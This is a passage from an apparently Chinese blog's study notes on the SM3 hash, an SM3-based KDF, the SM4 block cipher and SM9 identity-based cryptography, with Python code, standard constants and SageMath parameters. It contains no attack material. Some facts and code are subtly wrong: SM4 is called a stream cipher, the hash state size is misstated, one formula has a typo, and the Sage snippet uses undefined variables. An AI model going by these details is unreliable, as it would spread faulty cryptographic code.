<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expand</span>(<span class="params">Bi: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    消息扩展</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        Bi: 64字节512位的消息块</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        [W[0],...,W[67]],[W_[0],...,W_[63]]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    W = [<span class="built_in">int</span>.from_bytes(Bi[i:i+<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Bi), <span class="number">4</span>)] + [<span class="number">0</span>] * <span class="number">52</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="number">68</span>):</span><br><span class="line">        W[j] = P1(W[j - <span class="number">16</span>] ^ W[j - <span class="number">9</span>] ^ ROTL(W[j - <span class="number">3</span>], <span class="number">15</span>)) ^ ROTL(W[j - <span class="number">13</span>], <span class="number">7</span>) ^ W[j - <span class="number">6</span>]</span><br><span class="line">    W_ = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>):</span><br><span class="line">        W_[j] = W[j] ^ W[j + <span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> W, W_</span><br></pre></td></tr></table></figure>
<h4 id="消息压缩">消息压缩</h4>
<p>将消息分组 <span class="math inline">\(B_i\)</span> 扩展后压缩为 16
字节的杂凑值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">CF</span>(<span class="params">Vi: <span class="built_in">bytes</span>, Bi: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    消息压缩</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        Vi: 16字节64位的杂凑值</span></span><br><span class="line"><span class="string">        Bi: 64字节512位的消息块</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        Vi+1: 16字节64位的杂凑值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    A, B, C, D, E, F, G, H = Vi</span><br><span class="line">    W, W_ = expand(Bi)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        SS1 = ROTL((ROTL(A, <span class="number">12</span>) + E + ROTL(T[j], j % <span class="number">32</span>)) &amp; <span class="number">0xFFFFFFFF</span>, <span class="number">7</span>)</span><br><span class="line">        SS2 = SS1 ^ ROTL(A, <span class="number">12</span>)</span><br><span class="line">        TT1 = (FF[j](A, B, C) + D + SS2 + W_[j]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        TT2 = (GG[j](E, F, G) + H + SS1 + W[j]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        D = C</span><br><span class="line">        C = ROTL(B, <span class="number">9</span>)</span><br><span class="line">        B = A</span><br><span class="line">        A = TT1</span><br><span class="line">        H = G</span><br><span class="line">        G = ROTL(F, <span class="number">19</span>)</span><br><span class="line">        F = E</span><br><span class="line">        E = P0(TT2)</span><br><span class="line">    Vii = [A, B, C, D, E, F, G, H]</span><br><span class="line">    <span class="keyword">return</span> [(i ^ j) <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(Vi, Vii)]</span><br></pre></td></tr></table></figure>
<h4 id="杂凑迭代">杂凑迭代</h4>
<p>对填充过的消息分块后迭代压缩，最终杂凑值为 <span class="math inline">\(V_{i+1}\)</span>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    哈希函数</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        msg: 消息</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        32字节256比特的杂凑值（哈希值）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    msg = padding(msg)</span><br><span class="line">    hash_count = <span class="built_in">len</span>(msg) // <span class="number">64</span></span><br><span class="line">    B = [msg[i:i+<span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">64</span>)]</span><br><span class="line">    V = [IV] + [<span class="number">0</span>] * hash_count</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hash_count):</span><br><span class="line">        V[i + <span class="number">1</span>] = CF(V[i], B[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(<span class="built_in">int</span>(j).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> V[i + <span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<h3 id="基于-sm3-的-kdf">基于 SM3 的 KDF</h3>
<p>输入基密钥字节串 <span class="math inline">\(Z\)</span>
和派生密钥字节长度 <span class="math inline">\(klen\)</span>，输出派生密钥。</p>
<ol type="1">
<li>初始化 4 字节 32 比特计数器 <code>ct=0x00000001</code></li>
<li>从 <code>1</code> 到 <code>klen</code>，计算 <span class="math inline">\(Ha=Ha||\mathrm{Hash}(Z||ct)\)</span></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KDF</span>(<span class="params">Z: <span class="built_in">bytes</span>, klen: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    密钥派生算法（非标准实现，基于字节流实现）</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        Z: 基密钥字节串</span></span><br><span class="line"><span class="string">        klen: 派生的密钥字节长度</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> klen &lt; (<span class="number">2</span> ** <span class="number">32</span> - <span class="number">1</span>) * <span class="number">32</span></span><br><span class="line">    ct = <span class="built_in">int</span>(<span class="number">0x00000001</span>)</span><br><span class="line">    Ha = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(klen // <span class="number">32</span> + <span class="number">1</span>):</span><br><span class="line">        msg = Z + ct.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        Ha = Ha + <span class="built_in">hash</span>(msg)</span><br><span class="line">        ct += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Ha[<span class="number">0</span>:klen]</span><br></pre></td></tr></table></figure>
<h2 id="sm4">SM4</h2>
<p>SM4
分组密码算法，也是无线局域网标准的分组数据算法，是一种对称加密流密码，密钥长度和分组长度均为
128 比特 16 字节。</p>
<p>加密算法与密钥扩展算法都采用 32 轮非线性迭代结构，是典型的 Feistel
密码结构。</p>
<h3 id="密钥及密钥参量">密钥及密钥参量</h3>
<p><strong>加密密钥</strong>长度 128 比特 16 字节，每组 32 比特 4
字节（标准 <code>int32</code>），共 4 组，表示为 <span class="math inline">\(MK=(MK_0,MK_1,MK_2,MK_3)\)</span>。</p>
<p><strong>轮密钥</strong>每组 32 比特 4 字节，共 32 组，表示为 <span class="math inline">\(rk=(rk_0,rk_1,\cdots,rk_{31})\)</span>，轮密钥用于加密密钥生成。</p>
<p><span class="math inline">\(FK=(FK_0,FK_1,FK_2,FK_3)\)</span>，每组
32 比特 4 字节，共 4 组，为系统参数；</p>
<p><span class="math inline">\(CK=(CK_0,CK_1,\cdots,CK_{31})\)</span>，每组 32
比特 4 字节，共 32 组，为固定参数，二者都用于密钥扩展算法。</p>
<h3 id="轮函数">轮函数</h3>
<h4 id="轮函数结构">轮函数结构</h4>
<p>设输入为 128 比特 16 字节，每组 32 比特 4 字节，即 <span class="math inline">\((X_0,X_1,X_2,X_3)\)</span>，轮密钥为 <span class="math inline">\(rk\)</span>（32
组轮密钥中的一个），那么轮函数运算为 <span class="math display">\[
F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)
\]</span></p>
<h4 id="合成置换">合成置换</h4>
<p><span class="math inline">\(T\)</span> 变换为可逆变换，由非线性变换
<span class="math inline">\(\tau\)</span> 和线性变换 <span class="math inline">\(L\)</span> 复合而成，即 <span class="math inline">\(T(X)=L(\tau(X))\)</span>。</p>
<h5 id="非线性变换-tau">非线性变换 <span class="math inline">\(\tau\)</span></h5>
<p><span class="math inline">\(\tau\)</span> 由四个并行的 S 盒构成。
<span class="math display">\[
\tau(a_0,a_1,a_2,a_3)=(\mathrm{Sbox}(a_0),\mathrm{Sbox}(a_1),\mathrm{Sbox}(a_2),\mathrm{Sbox}(a_3))
\]</span> 其中 <span class="math inline">\((a_0,a_1,a_2,a_3)\)</span>
是每组 8 比特 1 字节的输入，且 <span class="math inline">\(\mathrm{Sbox}\)</span> 的数据如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Sbox = [</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<figure>
<img src="/sm-series-note/SM4%20Sbox数据.png" alt="SM4 Sbox数据">
<figcaption aria-hidden="true">SM4 Sbox数据</figcaption>
</figure>
<h5 id="线性变换-l">线性变换 <span class="math inline">\(L\)</span></h5>
<p>非线性变换 <span class="math inline">\(\tau\)</span> 的输出是线性变换
<span class="math inline">\(L\)</span> 的输入。 <span class="math display">\[
L(X)=X\oplus (X&lt;&lt;&lt;2)\oplus(X&lt;&lt;&lt;10)\oplus
(X&lt;&lt;&lt;18)\oplus(X&lt;&lt;&lt;24)
\]</span> 其中 <span class="math inline">\(X\)</span> 是 32 比特 4
字节的输入，<span class="math inline">\(&lt;&lt;&lt;\)</span>
代表循环左移。</p>
<h3 id="加密-1">加密</h3>
<p>设明文输入为 <span class="math inline">\((X_0,X_1,X_2,X_3)\)</span>，每组 32 比特 4
字节；</p>
<p>密文输出为 <span class="math inline">\((Y_0,Y_1,Y_2,Y_3)\)</span>，每组 32 比特 4
字节；</p>
<p>轮密钥为 <span class="math inline">\(rk_i,i=0,1,\cdots,31\)</span>。</p>
<p>运算过程如下：</p>
<ol type="1">
<li>32 次迭代运算：<span class="math inline">\(X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i),i=0,1,\cdots,31\)</span></li>
<li>反序变换：<span class="math inline">\((Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})\)</span></li>
</ol>
<h3 id="解密-1">解密</h3>
<p>将轮密钥反序即可，即 <span class="math inline">\(rk&#39;=(rk_{31},rk_{30},\cdots,rk_0)\)</span>。</p>
<h3 id="密钥扩展">密钥扩展</h3>
<p>轮密钥生成过程为</p>
<ol type="1">
<li>计算 <span class="math inline">\((K_0,K_1,K_2,K_3)=(MK_0\oplus
FK_0,MK_1\oplus FK_1,MK_2\oplus FK_2,MK_3\oplus FK_3)\)</span></li>
<li>轮密钥 <span class="math inline">\(rk_i=K_{i+4}=K_i\oplus
T&#39;(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus
CK_i),i=0,1,\cdots,31\)</span></li>
</ol>
<p>其中，<span class="math inline">\(T&#39;\)</span> 是将线性变换 <span class="math inline">\(L\)</span> 变为 <span class="math inline">\(L&#39;\)</span>： <span class="math display">\[
L&#39;(X)=X\oplus (X&lt;&lt;&lt;13)\oplus (X&lt;&lt;&lt;23)
\]</span> 系统参数 <span class="math inline">\(FK\)</span> 为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br></pre></td></tr></table></figure>
<p>固定参数 <span class="math inline">\(CK_i\)</span> 为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CK = [</span><br><span class="line">    <span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="sm9">SM9</h2>
<p>SM9 是标识密码算法（Identity-base
cryptogrphy），又称作身份基密码.</p>
<p>标准规范来源：<a href="http://www.gmbz.org.cn/main/bzlb.html">http://www.gmbz.org.cn/main/bzlb.html</a></p>
<h3 id="数字签名算法">数字签名算法</h3>
<h4 id="标准推荐参数">标准推荐参数</h4>
<p>使用 256 位的 BN 曲线，椭圆曲线方程为 <span class="math display">\[
y^2=x^3+b
\]</span> 曲线参数为：</p>
<p>参数 <span class="math inline">\(t\)</span>：<code>0x600000000058F98A</code></p>
<p>迹 <span class="math inline">\(tr(t)=6t^2+1\)</span>：<code>0xD8000000019062ED0000B98B0CB27659</code></p>
<p>基域特征 <span class="math inline">\(q(t)=36t^4+36t^3+24t^3+6t+1\)</span>：<code>0xB640000002A3A6F1D603AB4FF58EC74521F2934B1A7AEEDBE56F9B27E351457D</code></p>
<p>方程参数 <span class="math inline">\(b\)</span>：<code>0x05</code></p>
<p>群的阶 <span class="math inline">\(N(t)=36t^4+36t^3+18t^2+6t+1\)</span>：<code>0xB640000002A3A6F1D603AB4FF58EC74449F2934B18EA8BEEE56EE19CD69ECF25</code></p>
<p>余因子 <span class="math inline">\(cf=1\)</span></p>
<p>嵌入次数 <span class="math inline">\(k=12\)</span></p>
<p>扭曲线的参数 <span class="math inline">\(\beta=\sqrt{-2}\)</span></p>
<p><span class="math inline">\(k\)</span> 的因子 <span class="math inline">\(d_1=1,d_2=2\)</span></p>
<p>曲线识别符 <span class="math inline">\(cid\)</span>：<code>0x12</code></p>
<p>群 <span class="math inline">\(G_1\)</span> 的生成元 <span class="math inline">\(P_1\)</span>：<code>P1=(0x93DE051D62BF718FF5ED0704487D01D6E1E4086909DC3280E8C4E4817C66DDDD, 0x21FE8DDA4F21E607631065125C395BBC1C1C00CBFA6024350C464CD70A3EA616)</code></p>
<p>群 <span class="math inline">\(G_2\)</span> 的生成元 <span class="math inline">\(P_2\)</span>：</p>
<p><code>P2x=(0x85AEF3D078640C98597B6027B441A01FF1DD2C190F5E93C454806C11D8806141, 0x3722755292130B08D2AAB97FD34EC120EE265948D19C17ABF9B7213BAF82D65B)</code></p>
<p><code>P2y=(0x17509B092E845C1266BA0D262CBEE6ED0736A96FA347C8BD856DC76B84EBEB96, 0xA7CF28D519BE3DA65F3170153D278FF247EFBA98A71A08116215BBA5C999A7C7)</code></p>
<p>双线性对的识别符 <span class="math inline">\(eid\)</span>：<code>0x04</code></p>
<blockquote>
<p>扩域相关：</p>
<p>二次扩张的约化多项式为 <span class="math inline">\(x^2+2\)</span></p>
<p>四次扩张的约化多项式为 <span class="math inline">\(x^2-\sqrt{-2}\)</span></p>
<p>十二次扩张的约化多项式为 <span class="math inline">\(x^3-(-2)^{1/6}\)</span></p>
</blockquote>
<p>基于 Sagemath 的参数如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = <span class="number">0x600000000058F98A</span></span><br><span class="line">tr = <span class="number">6</span> * t ** <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">q = <span class="number">36</span> * t ** <span class="number">4</span> + <span class="number">36</span> * t ** <span class="number">3</span> + <span class="number">24</span> * t ** <span class="number">2</span> + <span class="number">6</span> * t + <span class="number">1</span></span><br><span class="line">b = <span class="number">0x05</span></span><br><span class="line">N = <span class="number">36</span> * t ** <span class="number">4</span> + <span class="number">36</span> * t ** <span class="number">3</span> + <span class="number">18</span> * t ** <span class="number">2</span> + <span class="number">6</span> * t + <span class="number">1</span></span><br><span class="line">cf = <span class="number">1</span></span><br><span class="line">k = <span class="number">12</span></span><br><span class="line"></span><br><span class="line">Fq.&lt;x&gt; = GF(q)[]</span><br><span class="line">E = EllipticCurve(Fqd1, [<span class="number">0</span>, b])</span><br><span class="line">Fq2.&lt;u&gt; = GF(p^<span class="number">2</span>, modulus = x ^ <span class="number">2</span> + <span class="number">2</span>)</span><br><span class="line"><span class="comment"># beta = sqrt(Fq2(-2))</span></span><br><span class="line">beta = u</span><br><span class="line">E2 = EllipticCurve(Fqd2, [<span class="number">0</span>, b * beta])</span><br><span class="line"></span><br><span class="line">P1x = <span class="number">0x93DE051D62BF718FF5ED0704487D01D6E1E4086909DC3280E8C4E4817C66DDDD</span></span><br><span class="line">P1y = <span class="number">0x21FE8DDA4F21E607631065125C395BBC1C1C00CBFA6024350C464CD70A3EA616</span></span><br><span class="line">P1 = E((P1x, P1y))</span><br><span class="line"></span><br><span class="line">P2x = <span class="number">0x85AEF3D078640C98597B6027B441A01FF1DD2C190F5E93C454806C11D8806141</span> * u + <span class="number">0x3722755292130B08D2AAB97FD34EC120EE265948D19C17ABF9B7213BAF82D65B</span></span><br><span class="line">P2y = <span class="number">0x17509B092E845C1266BA0D262CBEE6ED0736A96FA347C8BD856DC76B84EBEB96</span> * u + <span class="number">0xA7CF28D519BE3DA65F3170153D278FF247EFBA98A71A08116215BBA5C999A7C7</span></span><br><span class="line">P2 = E2((P2x, P2y))</span><br><span class="line"></span><br><span class="line">eid = <span class="number">0x04</span></span><br></pre></td></tr></table></figure>
<h4 id="符号-2">符号</h4>
<h5 id="加密主密钥">加密主密钥</h5>
<p>加密主密钥（encryption master
key）处于标识密码密钥分层结构最顶层的密钥，内容为<strong>加密主私钥</strong>和<strong>加密主公钥</strong>，其中加密主公钥是公开的，而加密主私钥由密码生成中心（KGC）秘密保存。KGC
使用加密主私钥和用户的标识（ID）生成<strong>用户的加密私钥</strong>。</p>
<h5 id="标识">标识</h5>
<p>标识（ID）由实体无法否认的信息组成，如电子邮箱、身份证号、电话号码等。</p>
<h5 id="曲线识别符-cid">曲线识别符 cid</h5>
<p>用于区分不同椭圆曲线的标识。</p>
<ul>
<li><code>0x10</code> 表示 <span class="math inline">\(F_p\)</span>
上的常曲线，<span class="math inline">\(p\)</span> 是素数，<span class="math inline">\(p&gt;2^{191}\)</span></li>
<li><code>0x11</code> 表示 <span class="math inline">\(F_p\)</span>
上的超奇异曲线</li>
<li><code>0x12</code> 表示 <span class="math inline">\(F_p\)</span>
上的常曲线及其扭曲线</li>
</ul>
<p>标准使用的是 BN 曲线（<span class="math inline">\(a=0,b=5\)</span>），<code>cid=0x12</code>。</p>
<h5 id="双线性对识别符-eid">双线性对识别符 eid</h5>
<ul>
<li><p><code>0x01</code> 表示 Tate 对</p></li>
<li><p><code>0x02</code> 表示 Weil 对</p></li>
<li><p><code>0x03</code> 表示 Ate 对</p></li>
<li><p><code>0x04</code> 表示 R-ate 对</p></li>
</ul>
<h4 id="系统签名主密钥和用户签名密钥的产生">系统签名主密钥和用户签名密钥的产生</h4>
<p>KGC 产生随机数 <span class="math inline">\(ks\in[1,N-1]\)</span>
作为签名主私钥，计算群 <span class="math inline">\(G_2\)</span> 中的元素
<span class="math inline">\(P_{pub-s}=ks\cdot P_2\)</span>
作为签名主公钥，则签名主密钥对为 <span class="math inline">\((ks,P_{pub-s})\)</span>。</p>
<p><strong>KGC 秘密保存 <span class="math inline">\(ks\)</span>，公开
<span class="math inline">\(P_{pub-s}\)</span>。</strong></p>
<p>KGC 选择并公开用一个字节表示签名私钥生成函数识别符 <span class="math inline">\(hid\)</span>。</p>
<p>用户 A 的标识为 <span class="math inline">\(ID\)</span>，KGC 在有限域
<span class="math inline">\(F_N\)</span> 上计算 <span class="math inline">\(t_1=H_1(ID||hid,N)+ks\)</span>，若 <span class="math inline">\(t_1=0\)</span>
则重新计算签名主私钥、更新签名主密钥对；</p>
<p>随后计算 <span class="math inline">\(t_2=ks\cdot
t^{-1}\pmod{N}\)</span>；</p>
<p>最后计算签名私钥 <span class="math inline">\(ds=t_2\cdot
P_1\)</span>。</p>
<h4 id="辅助函数">辅助函数</h4>
<h5 id="密码杂凑函数">密码杂凑函数</h5>
<p>标准推荐使用 SM3 密码杂凑算法，输出 256 比特 32 字节。</p>
<h5 id="密码函数-h_1">密码函数 <span class="math inline">\(H_1\)</span></h5>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity-note</title>
    <url>//solidity-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
]]></content>
  </entry>
</search>
